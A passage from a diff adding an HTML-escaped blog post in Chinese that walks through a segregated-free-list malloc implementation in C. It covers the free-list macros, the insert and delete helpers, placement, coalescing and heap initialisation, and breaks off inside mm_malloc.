+                best_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tmp_listp;
+            }
+        }
+    }
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; best_listp;
+}
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# endif
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;next fit 远高于另外两个算法&lt;/p&gt;
+&lt;h3 id=&#34;分离适配&#34;&gt;分离适配&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;+-+-+-+-+-+-+-+-+-+-+
+| Block Size  | 00A | A: Alloc
++-+-+-+-+-+-+-+-+-+-+
+|       pred        |
++-+-+-+-+-+-+-+-+-+-+
+|       succ        |
++-+-+-+-+-+-+-+-+-+-+
+|      Payload      |
++-+-+-+-+-+-+-+-+-+-+
+|      Padding      |
++-+-+-+-+-+-+-+-+-+-+
+| Block Size  | 00A | A: Alloc
++-+-+-+-+-+-+-+-+-+-+
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;新增的宏定义&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define MIN_BLOCK_SIZE 16
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;/* Given block ptr bp, compute pred and succ block */&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#define FD(bp) (*(char**)(bp))
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define BK(bp) (*(char**)((bp) + WSIZE))
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;/* Given block ptr bp, compute pred and succ ptr address*/&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#define FD_PTR(bp) ((char*)(bp))
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define BK_PTR(bp) ((char*)(bp + WSIZE))
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#define SET_FD(bp, val) (*(unsigned int*)(bp) = (unsigned int)(val))
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define SET_BK(bp, val) (*(unsigned int*)(bp+WSIZE) = (unsigned int)(val))
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;需要一个新的全局变量来存储几个链表&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define FREE_LIST_SIZE 10
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;free_lists[FREE_LIST_SIZE] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {NULL};
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;操作链表的函数&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* Following funcions was method of free_lists */&lt;/span&gt;
+size_t &lt;span style=&#34;color:#a6e22e&#34;&gt;size_to_type&lt;/span&gt;(size_t size) {
+    size_t x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;   (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)        ;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;)    x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;)    x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;)   x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;)   x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;512&lt;/span&gt;)   x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt;)  x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt;)  x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt;)  x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;                    x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; x;
+}
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;insert_node_to_free_list&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;bp, size_t size){
+    size_t list_num &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; size_to_type(size);
+    size_t last_head &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (size_t)free_lists[list_num];
+    SET_BK(bp, last_head);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (last_head &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; NULL) {
+        SET_FD(last_head, bp);
+    }
+    SET_FD(bp, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
+    free_lists[list_num] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bp;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
+}
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;delete_node_from_free_list&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;bp, size_t size) {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (FD(bp) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; NULL)
+        SET_BK(FD(bp), BK(bp));
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+        free_lists[size_to_type(size)] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; BK(bp);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (BK(bp) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; NULL)
+        SET_FD(BK(bp), FD(bp));
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其他函数都需要更改&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* place the block to a free block */&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;place&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;bp, size_t size){
+    size_t origin_size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_SIZE(HDRP(bp));
+    delete_node_from_free_list(bp, origin_size);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (origin_size &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; DSIZE) {
+        PUT(HDRP(bp), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
+        PUT(FTRP(bp), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
+        size_t remain_size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; origin_size &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; size;
+        PUT(HDRP(NEXT_BLKP(bp)), PACK(remain_size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
+        PUT(FTRP(NEXT_BLKP(bp)), PACK(remain_size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
+        insert_node_to_free_list(NEXT_BLKP(bp), remain_size);
+    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+        PUT(HDRP(bp), PACK(origin_size, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
+        PUT(FTRP(bp), PACK(origin_size, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
+    }
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
+}
+
+&lt;span style=&#34;color:#75715e&#34;&gt;/* find a fit free block (first fit) */&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;find_fit&lt;/span&gt;(size_t size) {
+    size_t list_num &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; size_to_type(size);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list_num; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; FREE_LIST_SIZE; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i)
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (free_lists[i] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; NULL)
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; tmp_ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; free_lists[i]; tmp_ptr &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; NULL; tmp_ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; BK(tmp_ptr))
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (GET_SIZE(HDRP(tmp_ptr)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; size)
+                    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; tmp_ptr;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
+}
+
+&lt;span style=&#34;color:#75715e&#34;&gt;/*
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * coalesce - Coalesce free block next by
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;coalesce&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;bp) {
+    size_t prev_alloc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_ALLOC(FTRP(PREV_BLKP(bp)));
+    size_t next_alloc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_ALLOC(HDRP(NEXT_BLKP(bp)));
+    size_t size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_SIZE(HDRP(bp));
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (prev_alloc &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; next_alloc)
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; bp;
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;/* coalesce with next block */&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;next_alloc &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; prev_alloc) {
+        size_t next_size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_SIZE(HDRP(NEXT_BLKP(bp)));
+        delete_node_from_free_list(bp, size);
+        delete_node_from_free_list(NEXT_BLKP(bp), next_size);
+        size &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; next_size;
+        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
+        PUT(HDRP(bp), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
+    }
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;/* coalesce with prev block */&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;prev_alloc &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; next_alloc) {
+        size_t prev_size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_SIZE(FTRP(PREV_BLKP(bp)));
+        delete_node_from_free_list(bp, size);
+        delete_node_from_free_list(PREV_BLKP(bp), prev_size);
+        size &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; prev_size;
+        PUT(HDRP(PREV_BLKP(bp)), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
+        PUT(FTRP(bp), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
+        bp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; PREV_BLKP(bp);
+    }
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;/* coalesce with prev and next block */&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;prev_alloc &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;next_alloc) {
+        size_t prev_size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_SIZE(FTRP(PREV_BLKP(bp)));
+        size_t next_size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_SIZE(HDRP(NEXT_BLKP(bp)));
+        delete_node_from_free_list(bp, size);
+        delete_node_from_free_list(PREV_BLKP(bp), prev_size);
+        delete_node_from_free_list(NEXT_BLKP(bp), next_size);
+        size &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; prev_size &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; next_size;
+        PUT(HDRP(PREV_BLKP(bp)), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
+        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
+        bp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; PREV_BLKP(bp);
+    };
+
+    insert_node_to_free_list(bp, size);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; bp;
+}
+
+&lt;span style=&#34;color:#75715e&#34;&gt;/*
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * extend_heap - extend heap with a free block
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;extend_heap&lt;/span&gt;(size_t words) {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;bp;
+    size_t size;
+    &lt;span style=&#34;color:#75715e&#34;&gt;/* Allocate and even number of words to maintain alignment */&lt;/span&gt;
+    size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (words &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; (words &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; WSIZE : words &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; WSIZE;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)(bp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; mem_sbrk(size)) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;/* Initialize free block header/footer and the epilogue header */&lt;/span&gt;
+    PUT(HDRP(bp), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
+    PUT(FTRP(bp), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
+    insert_node_to_free_list(bp, size);
+    PUT(HDRP(NEXT_BLKP(bp)), PACK(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;/* Coalesce if the previous block was free */&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; coalesce(bp);
+}
+
+&lt;span style=&#34;color:#75715e&#34;&gt;/* 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * mm_init - initialize the malloc package.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;mm_init&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;)
+{
+    &lt;span style=&#34;color:#75715e&#34;&gt;/* Create the initial empty heap */&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((heap_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; mem_sbrk(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; WSIZE)) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)   &lt;span style=&#34;color:#75715e&#34;&gt;/* sbrk() function returns the start address of the new area. */&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; FREE_LIST_SIZE; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i)
+        free_lists[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
+    PUT(heap_listp, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);                                     &lt;span style=&#34;color:#75715e&#34;&gt;/* Alignment */&lt;/span&gt;
+    PUT(heap_listp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; WSIZE), PACK(DSIZE, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));          &lt;span style=&#34;color:#75715e&#34;&gt;/* Prologue block&amp;#39;s size is 8 and is always alloced */&lt;/span&gt;
+    PUT(heap_listp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; WSIZE), PACK(DSIZE, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
+    PUT(heap_listp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; WSIZE), PACK(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));              &lt;span style=&#34;color:#75715e&#34;&gt;/* Epilogue header */&lt;/span&gt;
+    heap_listp &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; WSIZE);
+    
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (extend_heap(CHUNKSIZE&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;WSIZE) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL)
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+}
+
+&lt;span style=&#34;color:#75715e&#34;&gt;/* 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * mm_malloc - Allocate a block by incrementing the brk pointer.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *     Always allocate a block whose size is a multiple of the alignment.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;mm_malloc&lt;/span&gt;(size_t size)
+{
+    &lt;span style=&#34;color:#75715e&#34;&gt;/* Ignore spurious requests */&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
